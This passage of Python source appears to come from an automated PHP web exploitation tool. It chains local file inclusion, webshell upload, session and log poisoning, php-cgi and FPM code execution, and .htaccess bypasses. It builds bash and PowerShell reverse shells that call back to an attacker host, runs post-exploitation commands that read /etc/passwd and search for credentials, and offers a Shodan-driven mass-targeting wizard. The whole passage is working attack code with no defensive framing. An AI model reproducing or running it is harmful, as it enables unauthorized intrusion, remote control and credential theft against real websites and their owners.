
    for rel in ("index.php", "config.php", "../index.php"):
        src = lfi_read(t, route, rel)
        if src:
            t.note(Finding(K.LEAK, "lfi", f"source read {rel} ({len(src)}b)"))
            save_loot(t, "source_" + re.sub(r"[^\w]", "_", rel) + ".txt", src)
            break
    for cand in SCAN_SENSITIVE:
        try:
            r = t.get2(f"{page}?{param}={q(cand)}", read_cap=120_000)
        except OSError:
            continue
        if "root:x:0:0" in r.text:
            t.note(Finding(K.LEAK, "lfi", f"read {cand}"))
            save_loot(t, cand.strip("/").replace("/", "_"), r.body)
            break

    body = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>"
    b64cmd = base64.b64encode(cmd.encode()).decode()
    if t.profile.allow_url_include:
        for v in (f"data://text/plain;base64,{base64.b64encode(body.encode()).decode()}",
                  f"data://text/plain,{q(body)}"):
            try:
                r = t.get2(f"{page}?{param}={q(v, '/:.=+,;')}", read_cap=120_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "lfi:data", proof_body(r.text, LFI_MARKER, LFI_END) or "marker",
                               hard=True))
                ok(f"{t.host_header()} runs code via data://")
                return

    try:
        chain = build_chain(f"<?php echo '{LFI_MARKER}';system(base64_decode('{b64cmd}'));"
                            f"echo '{LFI_END}';?>")
    except KeyError:
        chain = ""
    for v in ([q(chain), q(chain, "/:.")] if chain else []):
        try:
            r = t.get2(f"{page}?{param}={v}", read_cap=200_000)
        except OSError:
            continue
        if LFI_MARKER in r.text:
            t.note(Finding(K.EXEC, "lfi:chain", proof_body(r.text, LFI_MARKER, LFI_END) or "marker",
                           hard=True))
            ok(f"{t.host_header()} runs code via filter chain")
            return

    try:
        r = t.get2(f"{page}?{param}={q('expect://' + cmd)}", read_cap=60_000)
        if cmd.split()[0] in r.text and "expect://" not in r.text:
            t.note(Finding(K.EXEC, "lfi:expect", r.text.strip()[:300], hard=True))
            ok(f"{t.host_header()} runs code via expect://")
    except OSError:
        pass


def _upload_names(stem: str = "phpomni") -> list[tuple[str, bytes]]:
    out = []
    for e in EXT_ORDER:
        body = PHP_EXEC.encode()
        if e in (".phps", ".shtml"):
            body = MIME_POLYGLOT + body
        for suf in NAME_SUFFIX:
            out.append((f"{stem}{e}{suf}", body))
    return out


RE_RETURNED = re.compile(r'"(?:url|file|path|location|filename|link|src)"\s*:\s*"([^"]{1,200})"', re.I)


def _returned_paths(text: str, fname: str) -> list[str]:
    cand = [m.group(1) for m in RE_RETURNED.finditer(text)]
    cand += [m.group(1) for m in re.finditer(r'href=["\']([^"\']*' + re.escape(fname) + r'[^"\']*)',
                                             text, re.I)]
    out: list[str] = []
    for u in cand:
        if fname not in u:
            continue
        u = u if u.startswith("/") else "/" + u.lstrip("./")
        if u not in out:
            out.append(u)
    return out[:6]


def _try_handler(t: Target, h: dict, fname: str, data: bytes) -> str:
    bnd = ("----phpomni" + uuid4().hex).encode()
    fields = list((h.get("extra") or {}).items())
    fields.append((h["field"], fname, data, "image/gif"))
    try:
        t.get(h["path"], read_cap=80_000)
        r = t.post(build_multipart(fields, bnd), f"multipart/form-data; boundary={bnd.decode()}",
                   path=h["path"], read_cap=80_000)
    except OSError:
        return ""
    if SHELL_MARKER in r.text:
        t.note(Finding(K.LEAK, "upload", f"reflected by {h['path']}"))
        return h["path"]
    hdir = h["path"].rsplit("/", 1)[0] + "/"
    for c in dict.fromkeys(_returned_paths(r.text, fname) + [hdir + fname]
                           + [d + fname for d in SHELL_DIRS]):
        try:
            if SHELL_MARKER in t.get(c, read_cap=40_000).text:
                return c
        except OSError:
            continue
    return ""


def upload_prong(t: Target, cmd: str, words: list[str]) -> None:
    handlers = discover_upload_handlers(t, words or [t.base])
    if not handlers:
        t.note(Finding(K.FAIL, "upload", "no handler discovered"))
        return
    t.handler = handlers[0]
    for h in handlers[:6]:
        t.handler = h
        for fname, data in _upload_names():
            path = _try_handler(t, h, fname, data)
            if not path:
                continue
            t.writable = h["path"].rsplit("/", 1)[0] + "/"
            t.note(Finding(K.LEAK, "upload", f"{h['path']} accepted {fname}"))
            if path == h["path"]:
                t.note(Finding(K.EXEC, "upload", f"executes on POST via {h['path']}", hard=True))
                ok(f"{t.host_header()} runs code on POST: {h['path']}")
                return
            try:
                r = t.get(f"{path}?c={q(base64.b64encode(cmd.encode()).decode())}", read_cap=120_000)
            except OSError:
                continue
            if SHELL_MARKER in r.text:
                t.shell_url = t.url(path)
                t.ext_ok = fname.rsplit(".", 1)[-1]
                t.note(Finding(K.SHELL, "upload", t.shell_url, hard=True))
                out = proof_body(r.text, "=B=", "=E=")
                if out:
                    t.note(Finding(K.EXEC, "shell", out[:300], hard=True))
                ok(f"{t.host_header()} SHELL {t.shell_url}")
                return


def config_upload_prong(t: Target, cmd: str) -> None:
    if not t.writable:
        return
    d, bnd = t.writable, ("----phpomni" + uuid4().hex).encode()
    field = (t.handler or {}).get("field", "file")
    extra = list(((t.handler or {}).get("extra") or {}).items())
    ctype = f"multipart/form-data; boundary={bnd.decode()}"
    hp = (t.handler or {}).get("path", d)

    try:
        orig = t.get(d + ".htaccess", read_cap=200_000)
    except OSError:
        orig = None
    if orig is not None and orig.status == 200 and orig.body:
        t.htaccess_orig = orig.body
        save_loot(t, "htaccess.bak", orig.body)
        inf(f"{t.host_header()} .htaccess backed up ({len(orig.body)}b)")

    def put(name: str, data: bytes) -> bool:
        try:
            t.post(build_multipart(extra + [(field, name, data, "text/plain")], bnd),
                   ctype, path=hp, read_cap=20_000)
            return True
        except OSError:
            return False

    for rules in HTACCESS_VARIANTS:
        if not put(".htaccess", rules) or not put("phpomni.phpomni", PHP_EXEC.encode()):
            continue
        try:
            if SHELL_MARKER in t.get(d + "phpomni.phpomni", read_cap=40_000).text:
                t.shell_url = t.url(d + "phpomni.phpomni")
                t.note(Finding(K.SHELL, "htaccess", t.shell_url, hard=True))
                ok(f"{t.host_header()} .htaccess bypass -> {t.shell_url}")
                return
        except OSError:
            continue
    for rules in USERINI_VARIANTS:
        if not put(".user.ini", rules) or not put("phpomni.php", PHP_EXEC.encode()):
            continue
        for _ in range(6):
            time.sleep(1.0)
            try:
                if SHELL_MARKER in t.get(d + "phpomni.php", read_cap=40_000).text:
                    t.shell_url = t.url(d + "phpomni.php")
                    t.note(Finding(K.SHELL, "userini", t.shell_url, hard=True))
                    ok(f"{t.host_header()} .user.ini bypass -> {t.shell_url}")
                    return
            except OSError:
                continue


def restore_config(t: Target) -> None:
    if t.htaccess_orig is None or not t.writable:
        return
    bnd = ("----phpomni" + uuid4().hex).encode()
    field = (t.handler or {}).get("field", "file")
    try:
        t.post(build_multipart([(field, ".htaccess", t.htaccess_orig, "text/plain")], bnd),
               f"multipart/form-data; boundary={bnd.decode()}",
               path=(t.handler or {}).get("path", t.writable), read_cap=20_000)
        ok(f"{t.host_header()} .htaccess restored")
    except OSError:
        warn(f"{t.host_header()} .htaccess restore FAILED - original is in loot")


def _progress_variants(name: str) -> tuple[str, ...]:
    inner = f'a:2:{{s:4:"name";s:{len(name)}:"{name}";s:8:"handler";s:3:"php";}}'
    return (f"upload_progress|{inner}", inner)


def session_prong(t: Target, cmd: str) -> None:
    if not t.route or not t.profile.session_progress:
        return
    page, param = t.route
    body = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>"
    bnd = ("----phpomni" + uuid4().hex).encode()
    stop = threading.Event()
    t.cookies[SID_COOKIE] = t.sid

    def keep(name: str) -> None:
        mp = build_multipart([("PHP_SESSION_UPLOAD_PROGRESS", name), (SID_COOKIE, t.sid),
                              ("f", "x.txt", os.urandom(1 << 16), "text/plain")], bnd)
        ct = f"multipart/form-data; boundary={bnd.decode()}"
        while not stop.is_set():
            try:
                t.post(mp, ct, path=page, read_cap=4096)
            except OSError:
                pass
            time.sleep(0.15)

    for name in _progress_variants(body):
        stop.clear()
        threading.Thread(target=keep, args=(name,), daemon=True).start()
        time.sleep(0.6)
        for sp in session_paths(t):
            for _ in range(4):
                try:
                    r = t.get2(f"{page}?{param}={q(sp + 'sess_' + t.sid)}", read_cap=120_000)
                except OSError:
                    break
                if LFI_MARKER in r.text:
                    stop.set()
                    t.note(Finding(K.EXEC, "session", proof_body(r.text, LFI_MARKER, LFI_END) or sp,
                                   hard=True))
                    ok(f"{t.host_header()} session poison via {sp}")
                    return
                time.sleep(0.25)
        stop.set()
        time.sleep(0.2)


def logpoison_prong(t: Target, cmd: str) -> None:
    if not t.route:
        return
    page, param = t.route
    payload = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>"
    for log in [c for c in SCAN_SENSITIVE if "log" in c or "environ" in c]:
        try:
            t.raw_request("GET", "/phpomni-" + uuid4().hex, extra={"User-Agent": payload})
        except OSError:
            continue
        for depth in (1, 3, 5):
            try:
                r = t.get2(f"{page}?{param}={q('../' * depth + log.lstrip('/'))}", read_cap=200_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "poison", f"{log}: "
                               f"{proof_body(r.text, LFI_MARKER, LFI_END)[:200]}", hard=True))
                ok(f"{t.host_header()} log poison via {log}")
                return


def phpcgi_prong(t: Target, cmd: str) -> None:
    payload = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>".encode()
    base = t.base.rsplit("/", 1)[0] + "/"
    for qs in ("?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a%2f%2finput",
               "?-d+auto_prepend_file%3dphp%3a%2f%2finput"):
        for path in (base + "index.php", t.base):
            try:
                r = t.raw_request("POST", path + qs, payload,
                                  {"Content-Type": "application/x-www-form-urlencoded"}, 80_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "phpcgi", proof_body(r.text, LFI_MARKER, LFI_END) or path,
                               hard=True))
                ok(f"{t.host_header()} php-cgi -d RCE (CVE-2012-1823 lineage)")
                return


def cgi_prong(t: Target, cmd: str) -> None:
    payload = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>".encode()
    for path in (t.base, t.base.rstrip("/") + "/index.php"):
        for qs in ("?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a%2f%2finput", "?-s"):
            try:
                r = t.raw_request("POST", path + qs, payload,
                                  {"Content-Type": "application/x-www-form-urlencoded"}, 80_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "cgi", proof_body(r.text, LFI_MARKER, LFI_END) or path,
                               hard=True))
                ok(f"{t.host_header()} CVE-2012-1823")
                return
            if "php.ini" in r.text and not t.profile.php:
                t.profile.sapi = "cgi"
                parse_ini(t, r.text)


def fpm_prong(t: Target, cmd: str) -> None:
    if not t.writable and not t.handler:
        return
    d = t.writable or "/"
    hp = (t.handler or {}).get("path", d)
    bnd = ("----phpomni" + uuid4().hex).encode()
    field = (t.handler or {}).get("field", "file")
    socks = ["127.0.0.1:9000"]
    if t.profile.php:
        socks.append(f"/var/run/php/php{t.profile.php}-fpm.sock")
    socks += ["/var/run/php-fpm.sock", "/run/php/php-fpm.sock"]
    for name, code in (("phpomni_fpm.php", PHP_FPM.encode()), ("phpomni_glob.php", PHP_GLOB.encode())):
        try:
            t.post(build_multipart([(field, name, code, "text/plain")], bnd),
                   f"multipart/form-data; boundary={bnd.decode()}", path=hp, read_cap=20_000)
        except OSError:
            continue
        for s in dict.fromkeys(socks):
            try:
                r = t.get(f"{d}{name}?s={q(s, '/:.')}&f={q(d + name, '/:.')}&c={q(cmd)}",
                          read_cap=200_000)
            except OSError:
                continue
            if re.search(r"uid=\d+|root:x:0", r.text):
                t.note(Finding(K.EXEC, "fpm", f"{s}: {r.text.strip()[:200]}", hard=True))
                ok(f"{t.host_header()} FPM socket RCE ({s})")
                return


def command_prong(t: Target, cmd: str) -> None:
    mark = uuid4().hex[:8]
    probe = f"echo {mark};{cmd}"
    for p in (t.base, t.base.rstrip("/") + "/index.php"):
        for k in ("cmd", "exec", "command", "c", "run", "shell", "1"):
            try:
                r = t.get2(f"{p}?{k}={q(probe)}", read_cap=80_000)
                if mark in r.text:
                    t.note(Finding(K.EXEC, "cmd", f"{p}?{k}: "
                                   f"{r.text.split(mark, 1)[1].strip()[:300]}", hard=True))
                    return
                r = t.post(f"{k}={q(probe)}".encode(), path=p, read_cap=80_000)
                if mark in r.text:
                    t.note(Finding(K.EXEC, "cmd", f"POST {p} {k}: "
                                   f"{r.text.split(mark, 1)[1].strip()[:300]}", hard=True))
                    return
            except OSError:
                continue


class HttpShell:
    """Commands over the webshell URL. Survives NAT, VPN tunnels and firewalls."""

    def __init__(self, t: Target, url: str):
        self.t, self.url = t, url
        self.shells = [url]

    def send(self, line: str) -> None:
        sep = "&" if "?" in self.url else "?"
        cq = q(base64.b64encode(line.encode()).decode())
        try:
            r = self.t.get(f"{self.url}{sep}c={cq}", read_cap=400_000)
        except OSError as exc:
            bad(f"http shell: {exc}")
            return
        out = proof_body(r.text, "=B=", "=E=")
        print(out if out else r.text.strip()[:4000], flush=True)

    def stop(self) -> None:
        pass


class CveShell:
    """Commands over the php2shell carrier. No file on disk."""

    def __init__(self, t: Target, lay: Layout, heap: int, lib: int, chain: str):
        self.t, self.lay, self.heap, self.lib, self.chain = t, lay, heap, lib, chain

    def send(self, line: str) -> None:
        cmd = f"{line} 2>&1"
        if len(cmd) > self.lay.max_cmd:
            warn(f"command trimmed to {self.lay.max_cmd} bytes")
            cmd = cmd[:self.lay.max_cmd]
        body = (fpm_chain if self.chain == "109619" else cve_trigger)(
            self.t, self.lay, self.heap, self.lib, cmd)
        print(body.strip()[:4000] if body else "(no output)", flush=True)

    def stop(self) -> None:
        pass


class ShellListener:
    def __init__(self, port: int):
        self.srv: socket.socket | None = None
        self.port = 0
        for p in ([0] if port == 0 else list(range(port, port + 8))):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", p))
                s.listen(8)
                s.settimeout(0.25)
                self.srv, self.port = s, s.getsockname()[1]
                break
            except OSError:
                continue
        self.shells: list[socket.socket] = []
        self._stop = threading.Event()
        if self.srv:
            threading.Thread(target=self._accept, daemon=True).start()

    @property
    def ok(self) -> bool:
        return self.srv is not None

    def _accept(self) -> None:
        while not self._stop.is_set() and self.srv:
            try:
                c, a = self.srv.accept()
            except (socket.timeout, OSError):
                continue
            c.settimeout(0.05)
            self.shells.append(c)
            ok(f"shell from {a[0]} ({len(self.shells)} active)")
            threading.Thread(target=self._pump, args=(c, a[0]), daemon=True).start()

    def _pump(self, c: socket.socket, ip: str) -> None:
        while not self._stop.is_set():
            try:
                data = c.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not data:
                break
            sys.stdout.write("\n" + data.decode("latin1", "replace"))
            sys.stdout.flush()
        warn(f"shell {ip} closed")

    def send(self, line: str) -> None:
        if not self.shells:
            warn("no shells")
            return
        for c in list(self.shells):
            try:
                c.sendall((line + "\n").encode())
            except OSError:
                self.shells.remove(c)

    def stop(self) -> None:
        self._stop.set()
        for c in self.shells:
            try:
                c.close()
            except OSError:
                pass
        if self.srv:
            self.srv.close()


def shell_payload(t: Target) -> bytes:
    if not (t.lhost and t.lport):
        return PHP_EXEC.encode()
    if t.profile.os == "windows":
        ps = (f"$c=New-Object Net.Sockets.TCPClient('{t.lhost}',{t.lport});$s=$c.GetStream();"
              "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
              "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()")
        enc = base64.b64encode(ps.encode("utf-16-le")).decode()
        return f"<?php shell_exec('powershell -ep bypass -enc {enc}');?>".encode()
    # /dev/tcp is a bash feature, and the command must nest cleanly inside a
    # double-quoted PHP string - the old single-quoted form was invalid PHP
    # ('$r='sh -c '...'' breaks out of the literal) and used sh, which has
    # no /dev/tcp on Debian.
    rev = f"bash -c 'bash -i >& /dev/tcp/{t.lhost}/{t.lport} 0>&1'"
    return ('<?php $r="' + rev + '";if(!@shell_exec($r)){@exec($r);}?>').encode()


def drop_shell(t: Target) -> None:
    if not t.shell_url:
        return
    bnd = ("----phpomni" + uuid4().hex).encode()
    d = t.writable or "/"
    try:
        t.post(build_multipart([((t.handler or {}).get("field", "file"),
                                 "phpomni_rev.php", shell_payload(t), "text/plain")], bnd),
               f"multipart/form-data; boundary={bnd.decode()}",
               path=(t.handler or {}).get("path", d), read_cap=20_000)
        t.get(d + "phpomni_rev.php", read_cap=20_000)
    except OSError:
        pass


STATE: dict[str, dict] = {}
STATE_LOCK = threading.Lock()
START = time.time()


def set_state(host: str, **kw) -> None:
    with STATE_LOCK:
        STATE.setdefault(host, {}).update(kw)


def dash_render() -> "Table":
    tbl = Table(expand=True, pad_edge=False)
    tbl.add_column("site", overflow="fold")
    tbl.add_column("doing", overflow="fold", width=12)
    tbl.add_column("result", overflow="fold")
    with STATE_LOCK:
        for host, s in list(STATE.items())[:40]:
            tbl.add_row(host, s.get("prong", "-"), (s.get("note") or s.get("state", ""))[:64])
    return tbl


def plan_for(t: Target, args) -> list[str]:
    steps: list[str] = []
    if t.profile.file_uploads and not args.no_upload:
        steps.append("upload")
    if not args.no_lfi:
        steps += ["lfi", "session", "logpoison"]
    if t.profile.allow_url_include:
        steps.append("phpcgi")
    steps += ["fpm", "cgi", "command"]
    if args.config_upload:
        steps.append("config")
    return list(dict.fromkeys(steps))


def run_target(t: Target, args, words: list[str], listener: ShellListener | None) -> Target:
    host = t.host_header()
    set_state(host, state="fingerprint")
    try:
        fingerprint(t, args)
    except OSError as exc:
        t.note(Finding(K.FAIL, "recon", str(exc)))
        set_state(host, state="dead", note=f"unreachable: {exc}")
        bad(f"{host} unreachable: {exc}")
        return t
    set_state(host, state="leaks")
    harvest_leaks(t)
    if t.profile.leaks:
        try:
            fingerprint(t, args)
        except OSError:
            pass

    chain, why = cve_gate(t) if not args.no_cve else ("", "disabled")
    if chain:
        set_state(host, prong="php2shell", state="trying")
        try:
            cve_prong(t, args.cmd, args, chain)
        except Exception as exc:
            if args.debug:
                traceback.print_exc()
            t.note(Finding(K.FAIL, "cve", repr(exc)[:160]))
        if args.cve_only:
            # --cve-only means NO fallback ladder, win or lose - falling
            # through on a failed chain used to run the whole upload/LFI
            # ladder against a CONFIG BLOCKED target.
            if t.hard:
                set_state(host, state="SHELL" if t.shell_url else "code ran")
                if listener and listener.ok and args.transport != "http":
                    drop_shell(t)
            return t
    else:
        t.note(Finding(K.LEAK, "cve", f"not applicable: {why}"))

    for step in plan_for(t, args):
        if t.hard and args.rce_only:
            break
        set_state(host, prong=step, state="trying")
        try:
            match step:
                case "upload":
                    upload_prong(t, args.cmd, [] if args.no_discover else words)
                case "lfi":
                    if not t.hard:
                        lfi_prong(t, args.cmd)
                case "session":
                    if not t.route:
                        t.route = discover_lfi_route(t)
                    session_prong(t, args.cmd)
                case "logpoison":
                    if not t.route:
                        t.route = discover_lfi_route(t)
                    logpoison_prong(t, args.cmd)
                case "phpcgi":
                    phpcgi_prong(t, args.cmd)
                case "fpm":
                    fpm_prong(t, args.cmd)
                case "cgi":
                    cgi_prong(t, args.cmd)
                case "command":
                    command_prong(t, args.cmd)
                case "config":
                    config_upload_prong(t, args.cmd)
        except Exception as exc:
            if args.debug:
                traceback.print_exc()
            t.note(Finding(K.FAIL, step, repr(exc)[:160]))
        hit = [f for f in t.findings if f.hard]
        set_state(host, note=hit[-1].detail if hit else "", state="hit" if hit else "-")

    if t.hard and listener and listener.ok and args.transport != "http":
        drop_shell(t)
    if args.restore_config and t.htaccess_orig is not None:
        restore_config(t)
    set_state(host, state="SHELL" if t.shell_url else ("code ran" if t.hard else "nothing"))
    return t


def meaning(t: Target) -> str:
    if t.shell_url:
        return "You have a webshell. You can run commands on this box."
    if t.hard:
        return "Code ran, but the shell file could not be reached."
    if t.route:
        return "The site reads files off disk but will not run code."
    return "Nothing worked. The upload form is probably behind a login."


def report(t: Target, as_json: bool) -> None:
    if as_json:
        print(json.dumps({"target": t.url("/"), "os": t.profile.os, "sapi": t.profile.sapi,
                          "php": t.profile.php, "arch": t.profile.arch, "shell": t.shell_url,
                          "hard": t.hard,
                          "findings": [{"kind": str(f.kind), "prong": f.prong, "detail": f.detail}
                                       for f in t.findings]}), flush=True)
        return
    say("")
    say(_c("=" * 78, "90"))
    say(f"{t.url('/')}   os={t.profile.os}  sapi={t.profile.sapi}  php={t.profile.php or '?'}")
    say("  " + meaning(t))
    for f in t.findings:
        col = {"LEAK": "36", "EXEC": "33", "SHELL": "32", "FAIL": "90"}[str(f.kind)]
        say(f"  {_c('[' + str(f.kind) + ']', col):<18} {f.prong:12} {f.detail}")
    if t.shell_url:
        say(_c(f"  >> {t.shell_url}?c=<base64 cmd>", "32"))
    say(_c("=" * 78, "90"))


def load_words(path: str | None) -> list[str]:
    for cand in ([path] if path else []) + [os.path.join(os.path.dirname(
            os.path.abspath(__file__)), "wordlist.txt")]:
        if cand and os.path.isfile(cand):
            with open(cand, encoding="utf-8", errors="replace") as fh:
                return [w.strip() for w in fh if w.strip() and not w.startswith("#")]
    return FALLBACK_WORDS


def shodan_targets(query: str, key: str, limit: int) -> list[str]:
    out: list[str] = []
    for page in range(1, 6):
        try:
            c = http.client.HTTPSConnection("api.shodan.io", timeout=20)
            c.request("GET", f"/shodan/host/search?key={key}&query={q(query)}&minify=true&page={page}")
            r = c.getresponse()
            if r.status == 429:
                time.sleep(2)
                continue
            matches = (json.loads(r.read() or b"{}") or {}).get("matches") or []
        except (OSError, ValueError):
            break
        if not matches:
            break
        for m in matches:
            ip, port = m.get("ip_str"), m.get("port")
            if not ip or not port:
                continue
            scheme = "https" if m.get("ssl") is not None else "http"
            out.append(f"{scheme}://{ip}{'' if port in (80, 443) else ':' + str(port)}/")
            if len(out) >= limit:
                return out
    return out[:limit]


def detect_mullvad() -> str:
    if os.name == "nt":
        return ""
    try:
        r = subprocess.run(["mullvad", "status"], capture_output=True, text=True, timeout=3)
        if "Connected" in (r.stdout + r.stderr):
            return "mullvad cli"
    except (OSError, subprocess.SubprocessError):
        pass
    try:
        with open("/proc/net/route") as fh:
            for line in fh.read().splitlines()[1:]:
                f = line.split()
                if len(f) > 3 and f[1] == "00000000" and "mullvad" in f[0]:
                    return f"route {f[0]}"
    except OSError:
        pass
    return ""


def public_ip() -> str:
    for u in ("https://am.i.mullvad.net/ip", "https://api.ipify.org"):
        try:
            r = Target(u, timeout=6, delay=(0, 0)).get("/", read_cap=4096)
            ip = r.text.strip().splitlines()[0].strip()
            if re.fullmatch(r"[\d.]+", ip):
                return ip
        except (OSError, IndexError):
            continue
    return ""


def mullvad_by_ip() -> bool:
    ip = public_ip()
    if not ip:
        return False
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in n for n in MULLVAD_NETS)


def auto_lhost() -> str:
    route = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        route = s.getsockname()[0]
        s.close()
    except OSError:
        pass
    pub = public_ip()
    if pub:
        try:
            if not ipaddress.ip_address(pub).is_private:
                return pub
        except ValueError:
            pass
    return route


def mullvad_port() -> str:
    for cmd in (["mullvad", "port-forwarding", "get"], ["mullvad", "port", "get"]):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        except (OSError, subprocess.SubprocessError):
            continue
        m = re.search(r"\b(\d{4,5})\b", r.stdout)
        if m:
            return m.group(1)
    return ""


def build_target(url: str, args) -> Target:
    hdrs = {}
    for h in args.header or []:
        if ":" in h:
            k, _, v = h.partition(":")
            hdrs[k.strip()] = v.strip()
    lo, _, hi = (args.delay or "").partition("-")
    return Target(url, lhost=args.lhost, lport=args.lport, timeout=args.timeout,
                  delay=(float(lo or 0), float(hi or lo or 0)), retries=args.retries,
                  headers=hdrs, cookie=args.cookie or "",
                  auth=tuple(args.auth.split(":", 1)) if ":" in (args.auth or "") else None,
                  proxy=args.proxy or "", strict_ssl=args.strict_ssl)


QUICK = {
    ".id": "id; whoami; hostname; uname -a",
    ".sys": "uname -a; cat /etc/os-release 2>/dev/null; cat /etc/issue 2>/dev/null",
    ".net": "ip a 2>/dev/null || ifconfig -a; netstat -antp 2>/dev/null | head -40",
    ".users": "cat /etc/passwd",
    ".files": "ls -la; pwd; ls -la /var/www 2>/dev/null; ls -la /home 2>/dev/null",
    ".suid": "find / -perm -4000 -type f 2>/dev/null | head -40",
    ".env": "env; tr '\\0' '\\n' < /proc/self/environ",
    ".creds": ("grep -rEi 'pass|secret|token|api_key' /var/www 2>/dev/null "
               "| grep -v node_modules | head -40"),
    ".cron": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null",
    ".docker": "ls -la /.dockerenv /var/run/docker.sock 2>/dev/null; mount | grep -i docker",
    ".tty": ("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
             "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
             "script -qc /bin/bash /dev/null"),
}

ACTIONS = [
    ("who am i", ".id"), ("system info", ".sys"), ("list files", ".files"),
    ("read /etc/passwd", ".users"), ("network info", ".net"),
    ("find SUID binaries", ".suid"), ("look for credentials", ".creds"),
    ("cron + docker", ".cron"), ("upgrade to a real shell", ".tty"),
    ("type my own command", ".raw"), ("show saved loot", ".loot"),
    ("show shell urls", ".url"), ("quit", ".exit"),
]


def shell_menu(sender, results: list[Target]) -> None:
    while True:
        pick = menu("what next?", ACTIONS, 1)
        if pick == ".exit":
            break
        if pick == ".loot":
            if not LOOT:
                warn("no loot dir")
            else:
                found = [os.path.join(r, f) for r, _, fs in os.walk(LOOT) for f in fs]
                for p in found:
                    say(p)
                if not found:
                    warn("nothing saved")
            continue
        if pick == ".url":
            for t in results:
                if t.shell_url:
                    say(t.shell_url)
            continue
        if pick == ".raw":
            sender.send(ask("  command"))
            continue
        sender.send(QUICK[pick])
    sender.stop()


def url_ok(v: str) -> bool:
    raw = re.sub(r"^https?://", "", v.strip()).split("/")[0]
    if raw.startswith("["):
        host = raw[1:raw.find("]")] if "]" in raw else raw[1:]
        return bool(re.fullmatch(r"[0-9a-fA-F:.]+", host))
    host = raw.split(":")[0]
    if not host or len(host) > 253:
        return False
    if host == "localhost" or re.fullmatch(r"[\d.]+", host):
        return True
    return bool(re.fullmatch(r"[\w\-]+(\.[\w\-]+)+", host))


def norm_url(v: str) -> str:
    v = v.strip()
    return v if v.startswith(("http://", "https://")) else "http://" + v


def ask(prompt: str, default: str = "", valid=None) -> str:
    while True:
        try:
            v = input(f"{prompt}" + (f" [{default}]" if default else "") + ": ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            raise SystemExit(0)
        v = v or default
        if valid and v:
            try:
                if not valid(v):
                    bad("that doesn't look right, try again")
                    continue
            except OSError:
                bad("could not open that, try again")
                continue
        if v:
            return v
        warn("this one's needed")


def menu(title: str, items: list[tuple[str, object]], default: int = 1):
    default = max(1, min(default, len(items)))
    say("")
    say(_c(title, "36"))
    for i, (label, _) in enumerate(items, 1):
        say(f"  {'*' if i == default else ' '}{i}) {label}")
    while True:
        raw = ask("  pick", str(default))
        if raw.isdigit() and 1 <= int(raw) <= len(items):
            return items[int(raw) - 1][1]
        bad("just the number from the list")


def wizard(args) -> argparse.Namespace | None:
    say(_c(BANNER, "36"))
    say("  a few questions, then it runs. press enter for the default.\n")

    kind = menu("what do you want to attack?", [
        ("one website", "url"),
        ("a list of websites in a file", "file"),
        ("search shodan", "shodan")], 1)
    targets: list[str] = []
    if kind == "url":
        targets = [norm_url(ask("  site address", "", url_ok))]
    elif kind == "file":
        path = ask("  path to the file", "", os.path.isfile)
        with open(path, encoding="utf-8") as fh:
            targets = [norm_url(x) for x in fh if x.strip() and not x.startswith("#")]
        ok(f"{len(targets)} sites loaded")
    else:
        if not args.shodan_key:
            args.shodan_key = ask("  shodan api key", "", lambda v: len(v) > 10)
        qs = ask("  search query", 'http.title:"Index of /" port:8080')
        inf("searching shodan...")
        try:
            targets = shodan_targets(qs, args.shodan_key, int(ask("  how many", "25") or 25))
        except ValueError:
            targets = shodan_targets(qs, args.shodan_key, 25)
        if not targets:
            bad("no results")
            return None
    if not targets:
        bad("no targets")
        return None

    vpn = detect_mullvad() or ("mullvad exit" if mullvad_by_ip() else "")
    if vpn:
        warn(f"VPN detected ({vpn}). A plain reverse shell usually cannot get back in.")
    args.transport = menu("how should a shell come back?", [
        ("auto - try reverse, fall back to HTTP", "auto"),
        ("reverse shell only", "rev"),
        ("commands over HTTP only - works behind any VPN", "http")], 3 if vpn else 1)

    auth = menu("does the site need a login?", [
        ("no", "none"), ("yes, I have a session cookie", "cookie"),
        ("yes, username and password", "basic")], 1)
    if auth == "cookie":
        args.cookie = ask("  cookie string")
    elif auth == "basic":
        args.auth = f"{ask('  username')}:{ask('  password')}"

    loud = menu("how loud should it be?", [
        ("quiet - slow, gentle, for live sites", "quiet"),
        ("normal", "normal"),
        ("loud - fast, also tries .htaccess tricks", "loud")], 2)
    if loud == "quiet":
        args.delay, args.threads = "0.3-0.8", 4
    elif loud == "loud":
        args.delay, args.threads, args.retries = "0-0.05", 16, 2
        args.config_upload = True
    else:
        args.delay, args.threads = "0.05-0.25", 8

    if args.transport != "http" and not args.lhost:
        args.lhost = auto_lhost()
        fwd = mullvad_port() if vpn else ""
        if fwd:
            args.lport = int(fwd)
